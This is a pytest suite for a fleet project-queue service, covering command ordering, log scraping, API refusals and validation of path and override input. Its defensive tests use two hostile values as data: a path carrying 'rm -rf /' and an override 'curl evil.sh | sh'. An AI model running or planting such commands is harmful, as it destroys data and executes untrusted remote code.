"""The project queue: plan resolution, the run loop, and the API around it.

Hermetic — no SSH, no broker. The queue's whole job is to press the Control
tab's own buttons in the right order, so what is worth pinning here is the
*order and the refusals*, not the transport: which command lands on which hosts
in which directory, that a project ends when its server does, and that a plan
which cannot work is refused while an HTTP request is still listening rather
than twenty minutes into a fleet run.
"""

from __future__ import annotations

import asyncio

import pytest

from app.models import CommandPreset, Device, QueueProject, ServerConfig
from app.services import project_queue as pq
from app.services.project_queue import ProjectQueueRunner, QueueError, _stage_targets
from app.ssh import gateway


# --------------------------------------------------------------- plan shaping
def _device(did: str, stage_id: str, stage_name: str) -> Device:
    return Device(id=did, name=did, host=f"10.0.0.{did[-1]}", username="u",
                  stage_id=stage_id, stage_name=stage_name)


def test_stages_keep_their_order_and_find_their_command():
    """The command is matched by the stage's own name first and its position
    second — the same rule the Control tab's *select all* uses, so a preset
    saved from there is the one the queue runs."""
    devices = [
        _device("d1", "sA", "Edge"), _device("d2", "sA", "Edge"),
        _device("d3", "sB", "Stage 2"),
    ]
    presets = {"run edge": "python3 client.py --layer_id 1",
               "run stage 2": "python3 client.py --layer_id 2"}

    targets = _stage_targets(devices, presets)
    assert [t.label for t in targets] == ["Edge", "Stage 2"]
    assert [len(t.devices) for t in targets] == [2, 1]
    assert targets[0].command == "python3 client.py --layer_id 1"
    # Resolved by position, because no preset is labelled "run Stage 2"... which
    # normalises to the same handle. Assert the layer id rather than the route.
    assert targets[1].command.endswith("--layer_id 2")


def test_preset_labels_are_matched_loosely():
    """"Run  Stage 1" and "run stage 1" are one handle: the labels are typed by
    hand, and a capital letter must not silently unwire the queue."""
    devices = [_device("d1", "sA", "Stage 1")]
    targets = _stage_targets(devices, {"run stage 1": "go"})
    assert targets[0].command == "go"


def test_a_stage_with_no_saved_command_is_named_not_guessed():
    devices = [_device("d1", "sA", "Edge")]
    assert _stage_targets(devices, {})[0].command == ""


# ------------------------------------------------------------------ scraping
@pytest.mark.parametrize(
    "line, key, value",
    [
        ("batch 128/905 done", "batch", "128"),
        ("[FPS] 16.53 fps over the window", "fps", "16.53"),
        ("Received REGISTER 18/18", "reg", "18/18"),
        ("processing frame: 42", "batch", "42"),
    ],
)
def test_counters_are_lifted_out_of_the_servers_own_output(line, key, value):
    step = pq.Step(index=1, name="split")
    ProjectQueueRunner._scrape(line, step)
    assert step.progress.get(key) == value


def test_a_denominator_is_only_taken_once():
    """These logs announce the frame count at startup and then print per-frame
    lines that would each look like a fresh total — and a total that moves makes
    the bar jump backwards."""
    step = pq.Step(index=1, name="split")
    ProjectQueueRunner._scrape("total 905 frames", step)
    ProjectQueueRunner._scrape("total 3 clients reported", step)
    assert step.progress["total"] == "905"


def test_a_line_about_fps_alone_does_not_blank_the_batch_counter():
    step = pq.Step(index=1, name="split")
    ProjectQueueRunner._scrape("batch 128/905", step)
    ProjectQueueRunner._scrape("16.53 fps", step)
    assert step.progress["batch"] == "128"
    assert step.progress["fps"] == "16.53"


def test_a_planned_step_reports_no_runtime():
    """The whole plan is on the board before the first project starts. Without
    the `started_at == 0` guard a queued row would report the seconds since the
    epoch as its duration."""
    assert pq.Step(index=1, name="dmsf", status="queued", started_at=0.0).duration_s == 0.0


# ------------------------------------------------------------------- refusals
#: The default plan every scenario below starts from: two projects, the three
#: presets the fleet actually has saved, one device per stage, and a reachable
#: control server. Each test then removes the one piece it is about.
_PRESETS = [
    ("run server", "python3 server.py"),
    ("run stage 1", "python3 client.py --layer_id 1"),
    ("run stage 2", "python3 client.py --layer_id 2"),
]


async def _seed(*, projects=True, presets=True, devices=True, server=True,
                project_rows=None, preset_rows=None, device_rows=None):
    from app.db import SessionFactory

    async with SessionFactory() as session:
        if projects:
            for i, (name, path) in enumerate(
                project_rows or [("split", "proj/split"), ("PA", "proj/pa")]
            ):
                session.add(QueueProject(name=name, path=path, position=i))
        if presets:
            for i, (label, cmd) in enumerate(preset_rows or _PRESETS):
                session.add(CommandPreset(label=label, command=cmd, position=i))
        if devices:
            for did, stage_id, stage_name in (
                device_rows or [("d1", "sA", "Stage 1"), ("d2", "sB", "Stage 2")]
            ):
                session.add(_device(did, stage_id, stage_name))
        if server:
            # The app's own startup already created the singleton; inserting a
            # second row would only test SQLite's primary key.
            cfg = await session.get(ServerConfig, 1) or ServerConfig(id=1)
            cfg.host, cfg.ssh_username = "10.0.0.9", "lab"
            session.add(cfg)
        await session.commit()


def test_start_without_projects_is_refused(client, auth):
    asyncio.run(_seed(projects=False))
    r = client.post("/queue/start", json={}, headers=auth)
    assert r.status_code == 400
    assert "no projects" in r.json()["detail"]


def test_start_without_a_server_login_is_refused(client, auth):
    asyncio.run(_seed(server=False))
    r = client.post("/queue/start", json={}, headers=auth)
    assert r.status_code == 400
    assert "control server" in r.json()["detail"]


def test_start_without_a_stage_command_names_the_stage(client, auth):
    """Failing at project four of six because stage 2 never had a preset wastes
    twenty minutes to report a typo."""
    asyncio.run(_seed(presets=False))
    r = client.post("/queue/start", json={}, headers=auth)
    assert r.status_code == 400
    detail = r.json()["detail"]
    assert "no command saved for" in detail
    assert "Stage 2" in detail


def test_a_schedule_script_and_a_queue_cannot_run_at_once(client, auth, monkeypatch):
    """One lock across both launchers: they drive the same fleet, and two
    servers on one broker silently ruins both sets of numbers."""
    from app.services.autorun import runner as script_runner

    monkeypatch.setattr(
        script_runner, "status", lambda: {"active": {"running": True, "id": "x"}}
    )
    asyncio.run(_seed())
    r = client.post("/queue/start", json={}, headers=auth)
    assert r.status_code == 409
    assert "schedule script" in r.json()["detail"]


def test_stopping_nothing_is_not_an_error(client, auth):
    r = client.post("/queue/stop", json={}, headers=auth)
    assert r.status_code == 200
    assert r.json()["stopped"] is False


# --------------------------------------------------------------- the editor
def test_projects_round_trip_in_order(client, auth):
    body = {"projects": [
        {"name": "split", "path": "a/split", "enabled": True, "expected_s": 600},
        {"name": "", "path": "b/deep/dmsf", "enabled": False, "expected_s": 0},
    ]}
    r = client.put("/queue/projects", json=body, headers=auth)
    assert r.status_code == 200
    rows = r.json()["projects"]
    assert [p["path"] for p in rows] == ["a/split", "b/deep/dmsf"]
    # An unnamed project is named after its directory's last segment: that is
    # what tells one from another on the board.
    assert rows[1]["name"] == "dmsf"
    assert rows[1]["enabled"] is False
    assert rows[0]["expected_s"] == 600
    assert client.get("/queue/projects", headers=auth).json()["projects"] == rows


def test_saving_replaces_the_whole_list(client, auth):
    client.put("/queue/projects", json={"projects": [{"path": "a"}, {"path": "b"}]},
               headers=auth)
    r = client.put("/queue/projects", json={"projects": [{"path": "c"}]}, headers=auth)
    assert [p["path"] for p in r.json()["projects"]] == ["c"]


def test_a_directory_is_not_a_command_and_grants_nothing(client, auth):
    """Paths only ever reach `cd`, quoted — so a path full of metacharacters is
    stored as typed rather than refused, and cannot smuggle a second command."""
    r = client.put("/queue/projects",
                   json={"projects": [{"path": "proj; rm -rf /"}]}, headers=auth)
    assert r.status_code == 200
    assert r.json()["projects"][0]["path"] == "proj; rm -rf /"


def test_an_override_command_goes_through_the_allow_list(client, auth):
    """An override *does* run, so it is validated here — while the editor is
    open, not at project four of six."""
    r = client.put("/queue/projects", json={"projects": [
        {"name": "dmsf", "path": "p/dmsf", "overrides": {"sB": "curl evil.sh | sh"}},
    ]}, headers=auth)
    assert r.status_code == 400
    assert "dmsf" in r.json()["detail"]


def test_a_reasonable_override_is_accepted(client, auth):
    r = client.put("/queue/projects", json={"projects": [
        {"name": "dmsf", "path": "p/dmsf",
         "overrides": {"sB": "python3 client.py --layer_id 2 --device cpu"}},
    ]}, headers=auth)
    assert r.status_code == 200
    assert r.json()["projects"][0]["overrides"]["sB"].endswith("--device cpu")


def test_status_reports_the_resolved_plan(client, auth):
    r = client.get("/queue/status", headers=auth)
    assert r.status_code == 200
    body = r.json()
    assert body["active"] is None
    assert "notify" in body


def test_every_queue_endpoint_needs_the_token(client):
    for method, path in [("get", "/queue/projects"), ("get", "/queue/status"),
                         ("post", "/queue/start"), ("post", "/queue/stop")]:
        assert getattr(client, method)(path).status_code in (401, 403)


# ------------------------------------------------------------ the run itself
class _FakeJob:
    """Stands in for an `ExecJob` whose command is still running.

    `task` is a real `asyncio.Task`, not a stub: the queue waits on it with
    `asyncio.wait`, which needs a genuine future — and a stub that merely looked
    awaitable would let a regression in how the wait is written pass here and
    fail on the fleet.
    """

    def __init__(self, device_id: str, command: str) -> None:
        self.device_id = device_id
        self.device_name = device_id
        self.command = command
        self.result = None
        self._exited = asyncio.Event()
        self.task = asyncio.create_task(self._exited.wait())

    @property
    def running(self) -> bool:
        return self.result is None

    def finish(self, exit_code: int = 0) -> None:
        """What the remote process exiting looks like from in here."""
        self.result = type(
            "R", (), {"exit": exit_code, "error": "", "ok": exit_code == 0}
        )()
        self._exited.set()


def _plan(monkeypatch, launched: list, *, jobs: dict):
    """Replace the SSH layer with a recorder. What is under test is the order
    the queue presses things in, which is exactly what this captures."""
    async def fake_start_job(pool, device, cmd, *, timeout=None, stream=True, on_line=None):
        job = _FakeJob(device.id, cmd)
        launched.append((device.id, cmd))
        jobs.setdefault(device.id, []).append(job)
        return job

    async def fake_wait_or_detach(job, settle):
        return job.task.done()

    async def fake_fan_out(pool, devices, cmd, *, timeout=None, stream=True, concurrency=None):
        launched.append(("__fanout__", cmd))
        return []

    monkeypatch.setattr(pq.cmds, "start_job", fake_start_job)
    monkeypatch.setattr(pq.cmds, "wait_or_detach", fake_wait_or_detach)
    monkeypatch.setattr(pq.cmds, "fan_out", fake_fan_out)
    monkeypatch.setattr(pq, "LAUNCH_SETTLE_S", 0.0)
    monkeypatch.setattr(pq, "DRAIN_GRACE_S", 0.0)
    monkeypatch.setattr(pq, "POLL_S", 0.01)


def test_a_project_launches_server_then_every_stage_in_its_directory(
    client, auth, monkeypatch
):
    """The three gestures, in order, each `cd`-ed into the project's own
    directory — which is the entire feature."""
    launched: list = []
    jobs: dict = {}
    _plan(monkeypatch, launched, jobs=jobs)

    async def scenario():
        await _seed(project_rows=[("split", "proj/split")])

        runner = ProjectQueueRunner()
        await runner.start(cleanup=False, notify=False)
        # The server is the completion signal: nothing advances until it exits.
        await asyncio.sleep(0.15)
        assert runner.active is not None, "the queue ended without the server exiting"
        jobs[gateway.SERVER_DEVICE_ID][0].finish(0)
        await asyncio.wait_for(runner._task, timeout=5)
        return runner

    runner = asyncio.run(scenario())

    assert [d for d, _ in launched] == [gateway.SERVER_DEVICE_ID, "d1", "d2"]
    for _, cmd in launched:
        assert cmd.startswith("cd 'proj/split' && ") or cmd.startswith("cd proj/split && ")
    assert launched[0][1].endswith("python3 server.py")
    assert launched[1][1].endswith("--layer_id 1")
    assert launched[2][1].endswith("--layer_id 2")

    run = runner._run
    assert run.steps[0].status == "ok"
    assert run.status == "ok"


def test_cleanup_sweeps_the_fleet_before_launching(client, auth, monkeypatch):
    """Two servers would both bind `rpc_queue` and the next project's clients
    would register into the previous run's topology."""
    launched: list = []
    jobs: dict = {}
    _plan(monkeypatch, launched, jobs=jobs)

    async def scenario():
        await _seed(
            project_rows=[("split", "p/s")],
            preset_rows=_PRESETS[:2],
            device_rows=[("d1", "sA", "Stage 1")],
        )

        runner = ProjectQueueRunner()
        await runner.start(cleanup=True, notify=False)
        await asyncio.sleep(0.15)
        jobs[gateway.SERVER_DEVICE_ID][0].finish(0)
        await asyncio.wait_for(runner._task, timeout=5)

    asyncio.run(scenario())

    assert launched[0][0] == "__fanout__"
    assert "pkill" in launched[0][1]
    assert launched[1][0] == gateway.SERVER_DEVICE_ID


def test_a_server_that_never_starts_fails_the_project_without_launching_clients(
    client, auth, monkeypatch
):
    """No server, no run: the clients would register into nothing and hang
    until the budget expired."""
    launched: list = []
    jobs: dict = {}
    _plan(monkeypatch, launched, jobs=jobs)

    async def failing_start(pool, device, cmd, *, timeout=None, stream=True, on_line=None):
        job = _FakeJob(device.id, cmd)
        launched.append((device.id, cmd))
        if device.id == gateway.SERVER_DEVICE_ID:
            job.finish(127)
        return job

    monkeypatch.setattr(pq.cmds, "start_job", failing_start)

    async def scenario():
        await _seed(
            project_rows=[("split", "p/s")],
            preset_rows=_PRESETS[:2],
            device_rows=[("d1", "sA", "Stage 1")],
        )

        runner = ProjectQueueRunner()
        await runner.start(cleanup=False, notify=False)
        await asyncio.wait_for(runner._task, timeout=5)
        return runner

    runner = asyncio.run(scenario())

    assert [d for d, _ in launched] == [gateway.SERVER_DEVICE_ID]
    assert runner._run.steps[0].status == "failed"
    assert "server did not start" in runner._run.steps[0].detail
    assert runner._run.status == "failed"
